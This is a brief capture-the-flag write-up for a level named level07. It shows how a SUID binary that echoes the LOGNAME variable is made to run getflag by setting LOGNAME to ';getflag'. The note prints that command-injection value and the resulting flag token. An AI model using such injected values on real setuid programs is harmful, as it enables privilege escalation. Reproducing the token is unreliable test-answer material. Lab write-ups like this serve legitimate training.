-SUID in home directory
-./level07 => level07
-strings on the suid just like before : we got this time /bin/echo so we can’t  create our script
-we got LOGNAME , I tried to change it to flag07 ; export LOGNAME=flag07; ./level07 => flag07
-so the script print the LOGNAME env variable so I set it. this time to ;getflag
export LOGNAME=“;getflag”
-and I got :
	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
